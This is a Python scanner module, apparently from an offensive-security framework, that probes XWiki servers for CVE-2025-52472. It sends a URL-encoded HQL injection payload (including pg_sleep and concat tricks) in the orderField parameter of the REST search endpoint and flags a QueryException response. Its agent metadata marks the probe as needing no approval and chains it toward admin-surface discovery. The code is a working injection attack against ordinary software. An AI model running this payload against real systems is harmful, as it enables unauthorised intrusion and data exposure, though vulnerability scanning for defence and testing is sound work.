#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki is vulnerable to Hibernate Query Language (HQL) injection in the wiki and space search REST API starting."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki - HQL Injection Detection',
        'description': 'XWiki is vulnerable to Hibernate Query Language (HQL) injection in the wiki and space search REST API starting in version 4.3-milestone-1 and prior to versions 16.10.9, 17.4.2, and 17.5.0. The vulnerability allows attackers to inject malicious HQL queries through the orderField parameter, potentially leading to data extraction, authentication bypass, or remote code execution depending on database backend and configuration.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xwiki', 'hqli', 'sqli', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://jira.xwiki.org/browse/XWIKI-23247', 'https://nvd.nist.gov/vuln/detail/CVE-2025-52472'],
        'cve': 'CVE-2025-52472',
    }

    def run(self):
        r = self.http_request(method="GET", path='/xwiki/rest/wikis/xwiki/search?q=test&scope=title&orderField=doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D%27%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment%27%20or%20a%3D%27%20order%20by%20doc.fullName', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/plain',)
        body_all = ('xwiki', 'QueryException: Exception while executing query. Query statement',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="XWiki - HQL Injection detected",
                path='/xwiki/rest/wikis/xwiki/search?q=test&scope=title&orderField=doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D%27%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment%27%20or%20a%3D%27%20order%20by%20doc.fullName',
            )
            return True
        return False

